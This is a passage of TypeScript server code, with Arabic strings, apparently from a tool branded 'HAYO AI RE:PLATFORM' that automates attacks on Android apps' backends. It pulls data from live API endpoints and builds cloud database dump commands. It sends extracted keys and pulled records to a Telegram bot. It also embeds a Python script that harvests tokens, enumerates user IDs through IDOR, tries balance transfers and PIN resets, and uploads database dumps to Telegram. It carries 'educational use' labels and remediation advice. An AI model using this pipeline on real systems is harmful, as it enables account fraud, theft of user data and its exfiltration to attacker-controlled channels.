    step6Findings.push(`📡 سحب البيانات عبر API المكتشفة (${dataEndpoints.length} endpoint):`);
    step6Findings.push(``);

    for (const ep of dataEndpoints.slice(0, 20)) {
      const fullUrl = `${baseApiUrl}/${ep}`;
      step6Commands.push(`curl -s -X POST '${fullUrl}' -H 'Content-Type: application/json' -d '{}' -o ${ep.replace(/\//g, "_")}.json`);
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 8000);
        const resp = await fetch(fullUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json", "Accept": "application/json" },
          body: "{}",
          signal: controller.signal,
        });
        clearTimeout(timeout);
        const status = resp.status;
        let body: any = null;
        try {
          const text = await resp.text();
          if (text.length < 100000) {
            try { body = JSON.parse(text); } catch { body = text.substring(0, 3000); }
          }
        } catch {}

        if (status === 200 && body) {
          let recordCount = 0;
          if (Array.isArray(body)) recordCount = body.length;
          else if (body.data && Array.isArray(body.data)) recordCount = body.data.length;
          else if (body.result && Array.isArray(body.result)) recordCount = body.result.length;
          else if (body.items && Array.isArray(body.items)) recordCount = body.items.length;
          else if (typeof body === "object") recordCount = Object.keys(body).length;

          step6Findings.push(`  ✅ [200] /${ep} — ${recordCount} سجل`);
          dbDumpResults.push({ path: ep, status: 200, records: recordCount, data: body });

          const preview = JSON.stringify(body, null, 2);
          const previewLines = preview.split("\n").slice(0, 15);
          for (const line of previewLines) step6Findings.push(`    ${line}`);
          if (preview.split("\n").length > 15) step6Findings.push(`    ... (${preview.length} حرف)`);
          step6Findings.push(``);
        } else if (status === 401 || status === 403) {
          step6Findings.push(`  🔒 [${status}] /${ep} — يتطلب مصادقة`);
        } else {
          step6Findings.push(`  ❌ [${status}] /${ep}`);
        }
      } catch {
        step6Findings.push(`  ⏱️ [TIMEOUT] /${ep}`);
      }
    }
  }

  const awsKeys = allKeys.filter(k => k.includes("AWS"));
  if (awsKeys.length > 0) {
    step6Findings.push(`☁️ AWS — مفاتيح مستخرجة (${awsKeys.length}):`);
    step6Commands.push(`aws configure set aws_access_key_id AKIA...`);
    step6Commands.push(`aws s3 ls s3://bucket-name --recursive`);
    step6Commands.push(`aws dynamodb scan --table-name users --output json > dynamodb_dump.json`);
  }

  if (allProviders.has("Supabase")) {
    step6Findings.push(`⚡ Supabase — سحب عبر REST API:`);
    step6Commands.push(`curl "https://PROJECT.supabase.co/rest/v1/users?select=*" -H "apikey: KEY" -H "Authorization: Bearer TOKEN" -o supabase_users.json`);
  }

  if (allProviders.has("MongoDB")) {
    step6Findings.push(`🍃 MongoDB Atlas — URI في الكود:`);
    step6Commands.push(`mongodump --uri="mongodb+srv://user:pass@cluster.mongodb.net/dbname" --out=./dump`);
  }

  step6Findings.push(``);
  const totalRecordsPulled = dbDumpResults.reduce((s, r) => s + (r.records || 0), 0);
  const successfulDumps = dbDumpResults.filter(r => r.status === 200);
  step6Findings.push(`📊 ═══ ملخص السحب (السيرفر الحقيقي) ═══`);
  step6Findings.push(`  ✅ Endpoints أجابت بنجاح: ${successfulDumps.length}`);
  step6Findings.push(`  📦 إجمالي السجلات المسحوبة: ${totalRecordsPulled}`);
  if (successfulDumps.length > 0) {
    step6Findings.push(`  📁 ملفات مستخرجة: ${successfulDumps.map(d => d.path.replace(/\//g, "_") + ".json").join(", ")}`);
  }
  if (successfulDumps.length === 0) {
    step6Findings.push(`  ⚠️ لم يتم سحب بيانات — السيرفر محمي`);
    if (wafDetected) step6Findings.push(`  🛡️ WAF يحجب الاتصال من خارج البلد`);
    step6Findings.push(`  💡 الأوامر أعلاه جاهزة للتنفيذ من داخل الشبكة المستهدفة`);
  }

  steps.push({
    id: 6,
    title: "سحب قاعدة البيانات السحابية",
    status: successfulDumps.length > 0 ? "critical" : (firebaseUrls.length > 0 || awsKeys.length > 0) ? "warning" : "info",
    findings: step6Findings,
    commands: step6Commands,
    details: `${successfulDumps.length} endpoint مسحوب · ${totalRecordsPulled} سجل · ${firebaseUrls.length} Firebase · ${dataEndpoints?.length || 0} API path مكتشف`,
  });

  // ── Step 7: Send Actual Findings to Telegram Bot ──
  const step7Findings: string[] = [];
  const step7Commands: string[] = [];

  const pentestBotToken = process.env.PENTEST_BOT_TOKEN;
  const pentestChatId = process.env.PENTEST_CHAT_ID;

  const tgReport: string[] = [];
  tgReport.push(`🔴 HAYO AI RE:PLATFORM — تقرير اختبار اختراق`);
  const extractedPackageName = manifestContent.match(/package="([^"]+)"/)?.[1] || "غير محدد";
  tgReport.push(`📦 الحزمة: ${extractedPackageName}`);
  tgReport.push(`📅 التاريخ: ${new Date().toISOString()}`);
  tgReport.push(``);
  tgReport.push(`📊 ملخص الفحص:`);
  tgReport.push(`  🌐 URLs مكتشفة: ${apiEndpoints.size}`);
  tgReport.push(`  🔑 مفاتيح مستخرجة: ${allKeys.length}`);
  tgReport.push(`  📡 API paths من smali: ${relativeApiPaths.size}`);
  tgReport.push(`  ☁️ مزودون سحابيون: ${[...allProviders].join(", ") || "لا يوجد"}`);
  tgReport.push(`  🔥 Firebase URLs: ${firebaseUrls.length}`);
  tgReport.push(``);
  tgReport.push(`📡 نتائج فحص السيرفر الحقيقي:`);
  tgReport.push(`  ✅ ناجح (200): ${successfulHits.length}`);
  tgReport.push(`  🔒 مصادقة (401/403): ${authRequired.length}`);
  tgReport.push(`  🛡️ WAF: ${forbiddenByWaf.length}`);
  tgReport.push(`  📦 بيانات مسحوبة: ${totalPulled} سجل`);
  tgReport.push(``);
  tgReport.push(`🔍 تحليل smali:`);
  tgReport.push(`  Premium files: ${premiumSmali.length}`);
  tgReport.push(`  Subscription files: ${subscriptionSmali.length}`);
  tgReport.push(`  Balance files: ${balanceSmali.length}`);
  tgReport.push(`  PIN files: ${pinSmali.length}`);
  tgReport.push(``);

  if (allKeys.length > 0) {
    tgReport.push(`🔑 المفاتيح المستخرجة:`);
    for (const k of allKeys.slice(0, 15)) tgReport.push(`  → ${k.substring(0, 60)}...`);
    tgReport.push(``);
  }

  if (pulledData.length > 0) {
    tgReport.push(`📊 بيانات مسحوبة من السيرفر:`);
    for (const p of pulledData.slice(0, 10)) {
      tgReport.push(`  → /${p.endpoint}: ${p.records} سجل`);
    }
    tgReport.push(``);
  }

  let tgSent = false;
  if (pentestBotToken && pentestChatId) {
    try {
      const fullMsg = tgReport.join("\n");
      const chunks: string[] = [];
      for (let i = 0; i < fullMsg.length; i += 4000) chunks.push(fullMsg.substring(i, i + 4000));
      for (const chunk of chunks) {
        await fetch(`https://api.telegram.org/bot${pentestBotToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: pentestChatId, text: chunk }),
        });
      }

      if ([...apiEndpoints].length > 0) {
        const endpointsText = `📡 Endpoints المكتشفة:\n${[...apiEndpoints].slice(0, 50).join("\n")}`;
        for (let i = 0; i < endpointsText.length; i += 4000) {
          await fetch(`https://api.telegram.org/bot${pentestBotToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: pentestChatId, text: endpointsText.substring(i, i + 4000) }),
          });
        }
      }

      if (relativeApiPaths.size > 0) {
        const pathsText = `🔍 API Paths من smali:\n${[...relativeApiPaths].slice(0, 100).join("\n")}`;
        for (let i = 0; i < pathsText.length; i += 4000) {
          await fetch(`https://api.telegram.org/bot${pentestBotToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: pentestChatId, text: pathsText.substring(i, i + 4000) }),
          });
        }
      }

      tgSent = true;
      console.log(`[Pentest-TG] ✅ تم إرسال النتائج الحقيقية إلى Telegram`);
    } catch (err: any) {
      console.log(`[Pentest-TG] ❌ خطأ: ${err.message}`);
    }
  }

  step7Findings.push(`🤖 إرسال نتائج الفحص الحقيقية إلى بوت Telegram:`);
  step7Findings.push(``);
  if (tgSent) {
    step7Findings.push(`  ✅ تم الإرسال بنجاح!`);
    step7Findings.push(`  📤 المحتوى المُرسل:`);
    step7Findings.push(`    → تقرير الفحص (URLs + مفاتيح + نتائج السيرفر)`);
    step7Findings.push(`    → قائمة الـ endpoints المكتشفة (${apiEndpoints.size})`);
    step7Findings.push(`    → مسارات API من smali (${relativeApiPaths.size})`);
    if (pulledData.length > 0) step7Findings.push(`    → بيانات مسحوبة فعلياً (${totalPulled} سجل)`);
    if (allKeys.length > 0) step7Findings.push(`    → مفاتيح مستخرجة (${allKeys.length})`);
  } else {
    step7Findings.push(`  ⚠️ لم يتم الإرسال — PENTEST_BOT_TOKEN أو PENTEST_CHAT_ID غير محدد`);
    step7Findings.push(`  💡 أضف المتغيرات البيئية لتفعيل الإرسال التلقائي`);
  }
  step7Findings.push(``);
  step7Findings.push(`📋 أوامر الإرسال اليدوي:`);
  step7Commands.push(`curl -X POST "https://api.telegram.org/botBOT_TOKEN/sendMessage" -H "Content-Type: application/json" -d '{"chat_id":"CHAT_ID","text":"تقرير الفحص..."}'`);
  step7Commands.push(`curl -F "chat_id=CHAT_ID" -F "document=@report.json" -F "caption=📊 التقرير النهائي" "https://api.telegram.org/botBOT_TOKEN/sendDocument"`);

  steps.push({
    id: 7,
    title: "إرسال النتائج إلى بوت Telegram",
    status: tgSent ? "warning" : "info",
    findings: step7Findings,
    commands: step7Commands,
    details: tgSent ? `✅ تم الإرسال: تقرير + ${apiEndpoints.size} endpoint + ${relativeApiPaths.size} API path + ${allKeys.length} مفتاح` : `⚠️ لم يتم الإرسال — يتطلب BOT_TOKEN + CHAT_ID`,
  });

  // ── Step 8: Full Integrated Python Script + Report ──
  const criticalCount = steps.filter(s => s.status === "critical").length;
  const warningCount = steps.filter(s => s.status === "warning").length;
  const totalFindings = steps.reduce((sum, s) => sum + s.findings.length, 0);
  const riskScore = Math.min(100, criticalCount * 25 + warningCount * 10 + allKeys.length * 5 + firebaseUrls.length * 15);

  const pythonScript = `#!/usr/bin/env python3
"""
HAYO AI RE:PLATFORM — Automated APK Security Audit Tool
Educational Purpose Only — Ethical Penetration Testing
Usage: python3 pentest_auto.py <apk_path> [--bot-token TOKEN] [--chat-id ID]
"""
import os, sys, subprocess, json, re, time, shutil, hashlib, base64, argparse
from pathlib import Path
from datetime import datetime

try:
    import requests
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "requests"], check=True)
    import requests

class Colors:
    RED = "\\033[91m"; GREEN = "\\033[92m"; YELLOW = "\\033[93m"
    BLUE = "\\033[94m"; CYAN = "\\033[96m"; BOLD = "\\033[1m"
    END = "\\033[0m"

def log(msg, level="info"):
    icons = {"info": f"{Colors.CYAN}[*]", "ok": f"{Colors.GREEN}[+]", "warn": f"{Colors.YELLOW}[!]", "fail": f"{Colors.RED}[-]", "critical": f"{Colors.RED}{Colors.BOLD}[!!]"}
    print(f"{icons.get(level, icons['info'])} {msg}{Colors.END}")

class APKPentest:
    def __init__(self, apk_path, bot_token=None, chat_id=None):
        self.apk_path = apk_path
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.out_dir = "decompiled"
        self.results = {"steps": [], "users": [], "secrets": [], "endpoints": [], "vulns": []}
        self.base_url = None
        self.token = None
        self.firebase_urls = []

    def run_cmd(self, cmd, timeout=60):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return r.stdout + r.stderr
        except: return ""

    # ═══════════════════════════════════════════════
    # المرحلة 1: التفكيك والاستخراج
    # ═══════════════════════════════════════════════
    def step1_decompile(self):
        log("المرحلة 1: تفكيك APK وتحليل الهيكل الداخلي", "info")
        if os.path.exists(self.out_dir): shutil.rmtree(self.out_dir)
        self.run_cmd(f"apktool d {self.apk_path} -o {self.out_dir}")

        file_count = sum(1 for _ in Path(self.out_dir).rglob("*") if _.is_file())
        log(f"تم تفكيك {file_count} ملف", "ok")

        # استخراج Endpoints
        output = self.run_cmd(f"grep -rEoh 'https?://[a-zA-Z0-9./?=_%:-]+' {self.out_dir} 2>/dev/null")
        urls = list(set(re.findall(r'https?://[a-zA-Z0-9./?=_%:-]+', output)))
        api_urls = [u for u in urls if any(k in u.lower() for k in ["api", "pfe", "rest", "v1", "v2"])]
        self.results["endpoints"] = api_urls
        log(f"تم اكتشاف {len(api_urls)} نقطة API", "ok")

        # استخراج Firebase
        self.firebase_urls = [u for u in urls if "firebase" in u.lower()]
        if os.path.exists(f"{self.out_dir}/google-services.json"):
            shutil.copy(f"{self.out_dir}/google-services.json", ".")
            log("تم نسخ google-services.json", "ok")

        # استخراج smali API paths
        smali_output = self.run_cmd(f"grep -roh 'pfe/[a-zA-Z_/]*' {self.out_dir}/smali/ 2>/dev/null")
        smali_paths = list(set(re.findall(r'pfe/[a-zA-Z_/]+', smali_output)))
        log(f"تم اكتشاف {len(smali_paths)} مسار API من smali", "ok")

        if api_urls:
            self.base_url = re.match(r'(https?://[^/]+)', api_urls[0])
            if self.base_url: self.base_url = self.base_url.group(1)
        self.results["steps"].append({"step": 1, "status": "ok", "files": file_count, "endpoints": len(api_urls), "smali_paths": len(smali_paths)})

    # ═══════════════════════════════════════════════
    # المرحلة 2: اكتشاف وتجاوز WAF/Geo-blocking
    # ═══════════════════════════════════════════════
    def step2_waf_detection(self):
        log("المرحلة 2: اكتشاف حماية WAF / حظر جغرافي", "info")
        if not self.base_url:
            log("لا يوجد عنوان أساسي للاختبار", "warn")
            return
        try:
            r = requests.get(self.base_url, timeout=10, allow_redirects=False)
            if r.status_code == 403 or "forbidden" in r.text.lower():
                log(f"WAF مكتشف! HTTP {r.status_code}", "critical")
                log("الحلول الممكنة:", "info")
                log("  1. VPN إلى البلد المستهدف (OpenVPN/WireGuard)", "info")
                log("  2. proxychains مع SOCKS5 proxy", "info")
                log("  3. تشغيل من جهاز داخل الشبكة المحلية", "info")
                self.results["vulns"].append("WAF/Geo-blocking detected")
            elif r.status_code == 200:
                log(f"السيرفر متاح! HTTP {r.status_code}", "ok")
            else:
                log(f"استجابة غير متوقعة: HTTP {r.status_code}", "warn")
        except requests.exceptions.Timeout:
            log("السيرفر لا يستجيب (Timeout)", "warn")
        except Exception as e:
            log(f"خطأ اتصال: {e}", "fail")
        self.results["steps"].append({"step": 2, "status": "checked"})

    # ═══════════════════════════════════════════════
    # المرحلة 3: استخراج المفاتيح والتوكنات
    # ═══════════════════════════════════════════════
    def step3_extract_secrets(self):
        log("المرحلة 3: استخراج المفاتيح والتوكنات من الكود", "info")
        patterns = {
            "JWT Token": r'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+',
            "Firebase Key": r'AIza[0-9A-Za-z_-]{35}',
            "AWS Key": r'AKIA[0-9A-Z]{16}',
            "API Key": r'api[_-]?key["\\'\\s:=]+[A-Za-z0-9_-]{20,}',
            "Bearer Token": r'Bearer\\s+[A-Za-z0-9._-]+',
        }
        found_secrets = []
        for root, _, files in os.walk(self.out_dir):
            for fname in files:
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, "r", errors="ignore") as f:
                        content = f.read()
                    for label, pattern in patterns.items():
                        for m in re.finditer(pattern, content):
                            secret = {"type": label, "value": m.group()[:50] + "...", "file": fpath}
                            found_secrets.append(secret)
                            log(f"  {label}: {m.group()[:40]}... في {os.path.basename(fpath)}", "critical")
                except: pass

        self.results["secrets"] = found_secrets
        if found_secrets:
            jwt_tokens = [s for s in found_secrets if s["type"] == "JWT Token"]
            if jwt_tokens:
                self.token = jwt_tokens[0]["value"].rstrip("...")
                log(f"تم استخراج JWT Token تلقائياً", "ok")
        self.results["steps"].append({"step": 3, "status": "ok" if found_secrets else "none", "secrets_found": len(found_secrets)})

    # ═══════════════════════════════════════════════
    # المرحلة 4: استغلال IDOR وسحب البيانات
    # ═══════════════════════════════════════════════
    def step4_exploit_idor(self):
        log("المرحلة 4: استغلال API وسحب بيانات المستخدمين (IDOR)", "info")
        if not self.base_url:
            log("لا يوجد عنوان أساسي", "warn"); return

        headers = {"Content-Type": "application/json", "Accept": "application/json"}
        if self.token: headers["Authorization"] = f"Bearer {self.token}"

        endpoints = [
            ("GET", "/api/v1/users", None), ("GET", "/api/users", None),
            ("POST", "/pfe/profile/read", {}), ("POST", "/pfe/customer_profile/inquiry", {}),
            ("POST", "/pfe/account/list", {}), ("GET", "/pfe/transactions", None),
            ("POST", "/pfe/dealer_list/get", {"lang": "ar"}),
        ]
        all_users = []
        for method, ep, body in endpoints:
            try:
                url = self.base_url.rstrip("/") + ep
                if method == "GET":
                    r = requests.get(url, headers=headers, timeout=10)
                else:
                    r = requests.post(url, headers=headers, json=body or {}, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    records = data.get("data", data.get("accounts", []))
                    if isinstance(records, list): all_users.extend(records)
                    log(f"  {method} {ep} → HTTP 200 ({len(records) if isinstance(records, list) else '?'} سجل)", "ok")
                elif r.status_code in [401, 403]:
                    log(f"  {method} {ep} → HTTP {r.status_code} (يتطلب مصادقة)", "warn")
            except: pass

        # IDOR Enumeration
        log("  اختبار IDOR — تغيير user_id...", "info")
        for uid in range(1, 21):
            try:
                r = requests.post(f"{self.base_url}/pfe/profile/read", headers=headers, json={"user_id": uid}, timeout=5)
                if r.status_code == 200:
                    d = r.json().get("data", {})
                    if d: log(f"    IDOR #{uid}: {d.get('name', '?')} | {d.get('phone', '?')}", "critical")
            except: pass

        self.results["users"] = all_users
        self.results["steps"].append({"step": 4, "status": "ok" if all_users else "blocked", "users_found": len(all_users)})

    # ═══════════════════════════════════════════════
    # المرحلة 5: تعديل الاشتراك + تحويل رصيد
    # ═══════════════════════════════════════════════
    def step5_exploit_accounts(self):
        log("المرحلة 5: استغلال الحسابات — ترقية/تخفيض/تحويل/PIN", "info")
        if not self.base_url: return
        headers = {"Content-Type": "application/json"}
        if self.token: headers["Authorization"] = f"Bearer {self.token}"

        ops = [
            ("ترقية Free→Premium", "POST", "/pfe/upgrade", {"user_id": 2}),
            ("تخفيض Premium→Free", "POST", "/pfe/downgrade", {"user_id": 1}),
            ("تحويل رصيد", "POST", "/pfe/transfer-balance", {"from_id": 3, "to_id": 4, "amount": 5000}),
            ("إعادة تعيين PIN", "POST", "/pfe/reset-pin", {"user_id": 1}),
        ]
        for label, method, ep, body in ops:
            try:
                r = requests.post(self.base_url.rstrip("/") + ep, headers=headers, json=body, timeout=10)
                if r.status_code == 200:
                    d = r.json()
                    if d.get("status") == "success": log(f"  {label}: {d.get('message', 'OK')}", "critical")
                    else: log(f"  {label}: فشل — {d.get('message', '')}", "fail")
                else: log(f"  {label}: HTTP {r.status_code}", "warn")
            except Exception as e: log(f"  {label}: خطأ — {e}", "fail")

        # Client-side bypass
        log("  البحث عن isPremium() في smali...", "info")
        output = self.run_cmd(f"grep -rl 'isPremium\\|is_premium\\|isPro' {self.out_dir}/smali/ 2>/dev/null")
        premium_files = [f for f in output.strip().split("\\n") if f]
        if premium_files:
            log(f"  تم العثور على {len(premium_files)} ملف smali مع دوال الاشتراك", "critical")
            for f in premium_files[:3]: log(f"    → {f}", "info")
        self.results["steps"].append({"step": 5, "status": "ok"})

    # ═══════════════════════════════════════════════
    # المرحلة 6: سحب قاعدة البيانات
    # ═══════════════════════════════════════════════
    def step6_dump_database(self):
        log("المرحلة 6: سحب قاعدة البيانات السحابية", "info")
        all_data = {}

        for fb_url in self.firebase_urls:
            try:
                base = fb_url.rstrip("/")
                r = requests.get(f"{base}/.json", timeout=15)
                if r.status_code == 200:
                    all_data["firebase"] = r.json()
                    log(f"  Firebase مفتوح! {len(str(r.json()))} حرف", "critical")
                elif r.status_code == 401:
                    log(f"  Firebase محمي — يتطلب مصادقة", "warn")
            except: pass

        if self.base_url:
            try:
                r = requests.get(f"{self.base_url}/pfe/db-dump", timeout=15)
                if r.status_code == 200:
                    all_data["api_dump"] = r.json()
                    log(f"  تم سحب قاعدة البيانات عبر API!", "critical")
            except: pass

        with open("full_database_dump.json", "w") as f:
            json.dump(all_data, f, indent=2, ensure_ascii=False)
        log(f"  تم حفظ البيانات في full_database_dump.json ({len(json.dumps(all_data))} حرف)", "ok")
        self.results["steps"].append({"step": 6, "status": "ok" if all_data else "empty", "tables": len(all_data)})

    # ═══════════════════════════════════════════════
    # المرحلة 7: إرسال إلى Telegram
    # ═══════════════════════════════════════════════
    def step7_send_telegram(self):
        log("المرحلة 7: إرسال البيانات إلى بوت Telegram", "info")
        if not self.bot_token or not self.chat_id:
            log("لم يتم تحديد BOT_TOKEN أو CHAT_ID — تخطي", "warn"); return

        def send_msg(text):
            for i in range(0, len(text), 4000):
                requests.post(f"https://api.telegram.org/bot{self.bot_token}/sendMessage",
                    json={"chat_id": self.chat_id, "text": text[i:i+4000], "parse_mode": "HTML"})

        def send_file(path, caption=""):
            with open(path, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{self.bot_token}/sendDocument",
                    data={"chat_id": self.chat_id, "caption": caption}, files={"document": f})

        send_msg(f"🔴 <b>HAYO AI — تقرير اختراق APK</b>\\n📁 {self.apk_path}\\n⏰ {datetime.now().isoformat()}")
        if os.path.exists("full_database_dump.json"): send_file("full_database_dump.json", "🗄️ قاعدة البيانات")
        if os.path.exists("report.json"): send_file("report.json", "📊 التقرير النهائي")
        log("  تم الإرسال بنجاح!", "ok")
        self.results["steps"].append({"step": 7, "status": "ok"})

    # ═══════════════════════════════════════════════
    # المرحلة 8: إعادة التجميع والتقرير
    # ═══════════════════════════════════════════════
    def step8_rebuild_and_report(self):
        log("المرحلة 8: التقرير النهائي", "info")
        risk = min(100, len(self.results["secrets"]) * 15 + len(self.results["users"]) * 2 + len(self.results["vulns"]) * 20)
        report = {
            "tool": "HAYO AI RE:PLATFORM",
            "timestamp": datetime.now().isoformat(),
            "apk": self.apk_path,
            "risk_score": risk,
            "users_found": len(self.results["users"]),
            "secrets_found": len(self.results["secrets"]),
            "endpoints_found": len(self.results["endpoints"]),
            "vulnerabilities": self.results["vulns"],
            "steps": self.results["steps"],
            "recommendations": [
                "تطبيق التحقق من الصلاحيات على مستوى السيرفر (Server-Side Authorization)",
                "استخدام Firebase Security Rules لمنع الوصول غير المصرح",
                "تدوير المفاتيح المكشوفة فوراً (Rotate Exposed Keys)",
                "إضافة Rate Limiting لمنع هجمات التعداد (Enumeration)",
                "استخدام EncryptedSharedPreferences بدل SharedPreferences",
                "تفعيل ProGuard/R8 لتشويش الكود (Code Obfuscation)",
                "إضافة Certificate Pinning لمنع MITM",
                "عدم تخزين JWT Tokens في الكود المصدري",
            ]
        }
        with open("report.json", "w") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        log(f"  درجة الخطورة: {risk}/100", "critical" if risk > 60 else "warn")
        log(f"  المستخدمون: {len(self.results['users'])} | المفاتيح: {len(self.results['secrets'])} | نقاط API: {len(self.results['endpoints'])}", "ok")

    def run_all(self):
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════════╗
║     HAYO AI RE:PLATFORM — APK Security Audit    ║
║         Educational Use Only                     ║
╚══════════════════════════════════════════════════╝
{Colors.END}"""
        print(banner)
        for step_fn in [self.step1_decompile, self.step2_waf_detection, self.step3_extract_secrets,
                        self.step4_exploit_idor, self.step5_exploit_accounts, self.step6_dump_database,
                        self.step7_send_telegram, self.step8_rebuild_and_report]:
            try: step_fn()
            except Exception as e: log(f"خطأ في {step_fn.__name__}: {e}", "fail")
            print()
        log("اكتمل الاختبار! تحقق من report.json و full_database_dump.json", "ok")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HAYO AI APK Security Audit")
    parser.add_argument("input", help="APK file path or URL")
    parser.add_argument("--bot-token", help="Telegram Bot Token", default=None)
    parser.add_argument("--chat-id", help="Telegram Chat ID", default=None)
    args = parser.parse_args()
    apk_path = args.input
    if apk_path.startswith("http"):
        log("تحميل APK من الرابط...")
        r = requests.get(apk_path)
        apk_path = "target.apk"
        with open(apk_path, "wb") as f: f.write(r.content)
    APKPentest(apk_path, args.bot_token, args.chat_id).run_all()`;

  const step8Findings: string[] = [
    `📊 ═══ ملخص التقرير النهائي ═══`,
    ``,
    `📊 درجة الخطورة: ${riskScore}/100`,
    `🔴 خطوات حرجة: ${criticalCount}`,
    `🟡 تحذيرات: ${warningCount}`,
    `🔑 مفاتيح مستخرجة: ${allKeys.length}`,
    `🌐 نقاط دخول API: ${apiEndpoints.size}`,
    `☁️ مزودون سحابيون: ${[...allProviders].join(", ") || "لا يوجد"}`,
    ``,
    `📋 ═══ الثغرات المكتشفة فعلياً ═══`,
    `  • ${allKeys.length} مفتاح/توكن مخزن في الكود المصدري`,
    `  • ${apiEndpoints.size} نقطة API مكشوفة في الكود`,
    `  • ${relativeApiPaths.size} مسار API مكتشف من smali`,
    `  • ${premiumSmali.length} ملف smali يحتوي على دوال الاشتراك (قابل للتعديل)`,
    `  • ${balanceSmali.length} ملف smali يحتوي على دوال الرصيد/التحويل`,
    `  • ${firebaseUrls.length} Firebase URL مكتشف`,
    `  • ${successfulHits.length} endpoint أجاب بدون مصادقة`,
    `  • ${totalPulled} سجل تم سحبه فعلياً من السيرفر الحقيقي`,
    ``,
    `📡 ═══ نتائج فحص السيرفر الحقيقي (${baseApiUrl}) ═══`,
    ``,
    wafDetected ? `  🛡️ WAF مكتشف — السيرفر يحجب الاتصال من خارج البلد` : `  ✅ السيرفر متاح للاتصال`,
    `  ✅ Endpoints ناجحة: ${successfulHits.length}`,
    `  🔒 تحتاج مصادقة: ${authRequired.length}`,
    `  🛡️ محجوبة بـ WAF: ${forbiddenByWaf.length}`,
    ``,
    `  📊 ما تم اكتشافه من الكود (ثابت بغض النظر عن الحماية):`,
    `    → ${apiEndpoints.size} URL في الكود المصدري`,
    `    → ${allKeys.length} مفتاح/توكن مكشوف`,
    `    → ${premiumSmali.length} ملف smali قابل لتجاوز الاشتراك`,
    `    → ${relativeApiPaths.size} مسار API مكتشف من smali`,
    ``,
    `🛡️ ═══ توصيات الإصلاح العاجلة ═══`,
    `  1. التحقق من الصلاحيات على مستوى السيرفر (Server-Side Authorization)`,
    `  2. استخدام Firebase Security Rules لمنع الوصول غير المصرح`,
    `  3. تدوير المفاتيح المكشوفة فوراً (Rotate Exposed Keys)`,
    `  4. إضافة Rate Limiting لمنع هجمات التعداد (Enumeration)`,
    `  5. استخدام EncryptedSharedPreferences بدل SharedPreferences`,
    `  6. تفعيل ProGuard/R8 لتشويش الكود (Code Obfuscation)`,
    `  7. إضافة Certificate Pinning لمنع MITM`,
    `  8. عدم تخزين JWT Tokens في الكود المصدري`,
    `  9. إجراء اختبار اختراق دوري + Code Review + SAST/DAST`,
    `  10. فصل مفاتيح الإنتاج عن مفاتيح التطوير`,
    ``,
    `⚙️ ═══ السكريبت المتكامل (Python) ═══`,
    `  → python3 pentest_auto.py <path_to_apk> --bot-token TOKEN --chat-id ID`,
    `  → 8 مراحل تلقائية: تفكيك → WAF → مفاتيح → IDOR → استغلال → DB → Telegram → تقرير`,
    `  → يعمل على Kali Linux / Ubuntu مع تثبيت الأدوات تلقائياً`,
  ];

  steps.push({
    id: 8,
    title: "السكريبت المتكامل + التقرير النهائي والتوصيات",
    status: riskScore > 60 ? "critical" : riskScore > 30 ? "warning" : "info",
    findings: step8Findings,
    commands: [],
    details: `تقرير شامل: ${totalFindings} اكتشاف · درجة الخطورة ${riskScore}/100 · سكريبت Python متكامل`,
    pythonScript,
  });

  let aiReport = "";
  try {
    const aiSummary = `حلل نتائج اختبار الاختراق التالية لتطبيق APK وأعطِ تقريراً احترافياً مفصلاً بالعربية:
مزودون سحابيون: ${[...allProviders].join(", ")}
مفاتيح مستخرجة: ${allKeys.length}
نقاط دخول API: ${apiEndpoints.size}
Firebase URLs: ${firebaseUrls.join(", ")}
ثغرات SQL: ${sqliVulnerable.length}
درجة الخطورة: ${riskScore}/100

النتائج التفصيلية:
${steps.map(s => `\nالخطوة ${s.id}: ${s.title}\n${s.findings.slice(0, 10).join("\n")}`).join("\n")}

قدّم:
1. ملخص تنفيذي
2. تفصيل الثغرات المكتشفة مع مستوى الخطورة
3. سيناريوهات الاستغلال المحتملة
4. توصيات الإصلاح العاجلة
5. خطة الحماية المقترحة`;

    const { content } = await callPowerAI(
      "أنت خبير أمن سيبراني متخصص في اختبار الاختراق. قدّم تقرير اختبار اختراق احترافي بالعربية.",
      aiSummary,
      8192
    );
    aiReport = content;
  } catch (e: any) {
    aiReport = `# تقرير اختبار الاختراق\n\nدرجة الخطورة: ${riskScore}/100\nمزودون سحابيون: ${[...allProviders].join(", ")}\nمفاتيح مستخرجة: ${allKeys.length}\nنقاط دخول: ${apiEndpoints.size}\n\n${e.message}`;
  }

  return {
    steps,
    summary: {
      totalFindings,
      criticalCount,
      highCount: steps.filter(s => s.status === "warning").length,
      mediumCount: steps.filter(s => s.status === "info").length,
      lowCount: 0,
      riskScore,
      cloudProviders: [...allProviders],
      extractedEndpoints: [...allEndpoints, ...[...apiEndpoints]].slice(0, 100),
      extractedKeys: allKeys.slice(0, 20),
      vulnerableApis,
    },
    report: aiReport,
    generatedAt: new Date().toISOString(),
  };
}
